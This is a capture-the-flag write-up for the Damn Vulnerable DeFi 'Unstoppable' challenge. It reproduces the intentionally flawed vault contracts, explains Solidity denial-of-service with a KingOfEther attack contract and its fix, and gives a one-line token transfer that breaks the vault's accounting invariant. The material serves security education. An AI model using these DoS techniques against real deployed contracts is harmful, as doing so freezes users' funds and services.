<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/raw/main/src/1.png">

# Target Contract Review

Given contracts.

**UnstoppableVault.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/utils/FixedPointMathLib.sol";
import "solmate/src/utils/ReentrancyGuard.sol";
import { SafeTransferLib, ERC4626, ERC20 } from "solmate/src/mixins/ERC4626.sol";
import "solmate/src/auth/Owned.sol";
import { IERC3156FlashBorrower, IERC3156FlashLender } from "@openzeppelin/contracts/interfaces/IERC3156.sol";

/**
 * @title UnstoppableVault
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626 {
    using SafeTransferLib for ERC20;
    using FixedPointMathLib for uint256;

    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

    error InvalidAmount(uint256 amount);
    error InvalidBalance();
    error CallbackFailed();
    error UnsupportedCurrency();

    event FeeRecipientUpdated(address indexed newFeeRecipient);

    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, "Oh Damn Valuable Token", "oDVT")
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view returns (uint256) {
        if (address(asset) != _token)
            return 0;

        return totalAssets();
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashFee(address _token, uint256 _amount) public view returns (uint256 fee) {
        if (address(asset) != _token)
            revert UnsupportedCurrency();

        if (block.timestamp < end && _amount < maxFlashLoan(_token)) {
            return 0;
        } else {
            return _amount.mulWadUp(FEE_FACTOR);
        }
    }

    function setFeeRecipient(address _feeRecipient) external onlyOwner {
        if (_feeRecipient != address(this)) {
            feeRecipient = _feeRecipient;
            emit FeeRecipientUpdated(_feeRecipient);
        }
    }

    /**
     * @inheritdoc ERC4626
     */
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
        uint256 fee = flashFee(_token, amount);
        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);
        // callback must return magic value, otherwise assume it failed
        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();
        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }

    /**
     * @inheritdoc ERC4626
     */
    function beforeWithdraw(uint256 assets, uint256 shares) internal override nonReentrant {}

    /**
     * @inheritdoc ERC4626
     */
    function afterDeposit(uint256 assets, uint256 shares) internal override nonReentrant {}
}
```

This contract provides the functionality for executing flash loans and managing the fees associated with them. It ensures that the flash loan is properly executed and that the fees are transferred to the designated fee recipient.

- The contract defines constants such as **FEE_FACTOR (0.05 ether)** and **GRACE_PERIOD (30 days)**.
- The contract has a feeRecipient address variable that stores the address where the flash loan fees will be sent.

In the constructor initializes the feeRecipient address and emits an event to notify the update.


`maxFlashLoan()` : Returns the maximum amount that can be borrowed in a flash loan, while the flashFee function calculates the fee to be charged for a flash loan.

`flashFee()` : Returns the flash's fee.

`setFeeRecipient()` : Allows the owner to update the feeRecipient address.

`totalAssets()` : Returns the total amount of assets held by the contract.

`flashLoan()` : Allows users to execute a flash loan. It transfers the requested amount of tokens to the receiver contract, executes the receiver's callback function, and then transfers back the borrowed amount plus the fee. If the callback function does not return the expected magic value, the flash loan is considered failed.

**ReceiverUnstoppable.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/src/auth/Owned.sol";
import { UnstoppableVault, ERC20 } from "../unstoppable/UnstoppableVault.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)
            revert UnexpectedFlashLoan();

        ERC20(token).approve(address(pool), amount);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(
            this,
            asset,
            amount,
            bytes("")
        );
    }
}
```

This is a smart contract called `ReceiverUnstoppable` that is designed to receive flash loans from the `UnstoppableVault` contract.

The contract imports the **IERC3156FlashBorrower** interface from the OpenZeppelin library, which allows it to interact with the flash loan functionality. Also it imports the Owned contract from the solmate library, which provides ownership functionality.

And, the contract has a constructor function that takes the address of the UnstoppableVault contract as a parameter and sets it as an immutable variable.


`onFlashLoan()` : This function from the IERC3156FlashBorrower interface. It is called by the UnstoppableVault contract when a flash loan is initiated. It checks that the initiator is the contract itself, the sender is the UnstoppableVault contract, the token is the same as the asset of the UnstoppableVault contract, and the fee is 0. If any of these conditions are not met, it reverts the transaction.

`executeFlashLoan()` : This function is a public function that can only be called by the owner of the contract. It calls the `flashLoan()` function of the UnstoppableVault contract, passing the contract itself as the borrower, the asset address, the loan amount, and an empty bytes array as parameters.


Overall, this contract acts as a receiver for flash loans from the UnstoppableVault contract, allowing the owner of the contract to execute flash loans of a specified amount.

Challenge's message:

> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
To pass the challenge, make the vault stop offering flash loans.
You start with 10 DVT tokens in balance.

## DoS Attack In Solidity

There are many ways to attack a smart contract to make it unusable. DoS is one of the most popular way to perform this aim. Shortly, any interference with a Service that reduces or **loses its availability** is called a Denial of Service. Simply put, normal service requests that a user needs cannot be processed by the system. For example, when a computer system crashes or its bandwidth is exhausted or its hard disk is filled up so that it cannot provide normal service, it constitutes a DoS. 

**In the blockchain, DoS attacks disrupt, suspend, or freeze the execution of a normal contract, or even the logic of the contract itself**.

#### Example: King Of Ether

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```

## How to prevent DoS Attack?

To prevent this attack, developers can modify the King of the Ether smart contract to utilize a **withdrawal pattern** that enables players to withdraw their winnings instead of having them sent directly from the play function. Here’s an example implementation:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

# Subverting

To discharge this challenge, we must broken vault's flashs with enforcing `(convertToShares(totalSupply) != balanceBefore)` condition.

In the `UnstoppableVault` contract, the asset is the underlying token called `DVT` that user deposit/withdraw into the vault. And the share is the amount of vault tokens called `oDVT` that the vault mint/burn for users to represent their deposited assets.

**ERC4626** is an extension of ERC20 that proposes a standard interface for token vaults. `convertToShares()` function returns the amount of shares that would be exchanged by the vault for the amount of assets provided. In this case, this function **open to enforce**. In other words, `totalSupply` of the vault tokens should always equal `totalAsset` of underlying tokens before any flash loan execution. If there exist alternative implementations of the vault that route asset tokens to different contracts, the `flashLoan()` function would remain non-operational.

Since the contract is an ERC20, we can use `transfer()` to send DVT tokens to it. Thus, the lender is unable to provide any additional flashloans. Here is attacker commands:

```js
await token.transfer(vault.address, token.balanceOf(player.address));
```

Solve the challenge.

```powershell
  [Challenge] Unstoppable
    ✔ Execution


  1 passing (2s)

Done in 2.69s.
```

**_by wasny0ps_**
